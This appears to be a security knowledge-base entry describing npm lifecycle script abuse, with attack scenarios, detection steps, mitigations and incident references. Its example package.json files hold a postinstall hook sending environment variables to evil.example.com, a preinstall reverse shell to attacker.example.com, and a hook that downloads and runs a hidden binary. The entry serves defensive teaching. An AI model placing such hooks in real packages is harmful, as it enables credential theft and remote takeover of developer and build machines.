---
name: "Lifecycle Script Abuse"
packageManager: "npm"
slug: "npm-lifecycle-scripts"
category: "Code Execution"
severity: "critical"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "npm supports lifecycle scripts such as preinstall, postinstall, and preuninstall that execute arbitrary shell commands during package installation. Attackers embed malicious commands in these scripts to exfiltrate environment variables, download and execute malware, or establish persistent backdoors. Because these scripts run automatically with no user interaction beyond `npm install`, they represent one of the most abused vectors in the npm ecosystem."
prerequisites:
  - "Ability to publish a package to the npm registry or compromise an existing one"
  - "Target must install the malicious package via npm install"
attackScenarios:
  - title: "Malicious postinstall Script Exfiltrating Credentials"
    description: "An attacker publishes a package with a postinstall script that collects sensitive environment variables such as AWS keys, CI/CD tokens, and NPM auth tokens, then exfiltrates them to an attacker-controlled server."
    commands:
      - label: "Malicious package.json with postinstall hook"
        code: |
          {
            "name": "helpful-utility-pkg",
            "version": "1.0.0",
            "scripts": {
              "postinstall": "curl -s https://evil.example.com/collect?data=$(env | base64 -w0)"
            }
          }
        language: "json"
  - title: "Reverse Shell via preinstall Script"
    description: "A preinstall script establishes a reverse shell back to the attacker, granting interactive access to the build server or developer workstation the moment the package is installed."
    commands:
      - label: "package.json with reverse shell payload"
        code: |
          {
            "name": "legit-looking-lib",
            "version": "2.0.0",
            "scripts": {
              "preinstall": "node -e \"require('child_process').exec('bash -i >& /dev/tcp/attacker.example.com/4444 0>&1')\""
            }
          }
        language: "json"
  - title: "Persistence via postinstall Malware Download"
    description: "The postinstall script downloads a compiled binary from an external host and installs it as a system service or cron job, persisting beyond the lifetime of the npm package itself. This pattern has been observed in real-world supply chain attacks targeting the npm ecosystem."
    commands:
      - label: "package.json that downloads and executes a payload"
        code: |
          {
            "name": "event-handler-utils",
            "version": "1.2.3",
            "scripts": {
              "postinstall": "curl -sL https://evil.example.com/payload -o /tmp/.cache_worker && chmod +x /tmp/.cache_worker && /tmp/.cache_worker &"
            }
          }
        language: "json"
detection:
  - title: "Inspect Package Contents Before Installing"
    description: "Use npm pack to download and inspect the package tarball without executing any scripts. Review the package.json scripts section for suspicious commands before allowing installation."
    commands:
      - code: |
          npm pack <package-name>
          tar -xzf *.tgz && cat package/package.json | grep -A 10 '"scripts"'
        language: "bash"
      - code: "npm show <package-name> scripts"
        language: "bash"
  - title: "Disable Lifecycle Scripts During Install"
    description: "Use the --ignore-scripts flag to prevent automatic execution of lifecycle scripts during installation, then manually review and run them if needed."
    commands:
      - code: "npm install --ignore-scripts"
        language: "bash"
  - title: "Use Static Analysis and Package Scanning Tools"
    description: "Integrate tools such as Socket.dev, npm audit, or read-package-json into your CI/CD pipeline to automatically flag packages with suspicious install scripts."
    commands:
      - code: "npx socket optimize"
        language: "bash"
      - code: "npm audit"
        language: "bash"
mitigation:
  - "Always install packages with --ignore-scripts in CI/CD environments and audit scripts before enabling them"
  - "Use npm audit and third-party tools like Socket.dev to scan dependencies for malicious lifecycle scripts"
  - "Pin exact dependency versions in package-lock.json and review changes to scripts on version bumps"
  - "Restrict network access during builds to prevent data exfiltration from install scripts"
references:
  - title: "eslint-scope Incident Postmortem"
    url: "https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes"
  - title: "event-stream Supply Chain Attack Analysis"
    url: "https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident"
  - title: "Socket Security - GitHub App"
    url: "https://github.com/apps/socket-security"
  - title: "npm Lifecycle Scripts Documentation"
    url: "https://docs.npmjs.com/cli/v10/using-npm/scripts"
created: 2026-04-02
updated: 2026-04-02
---
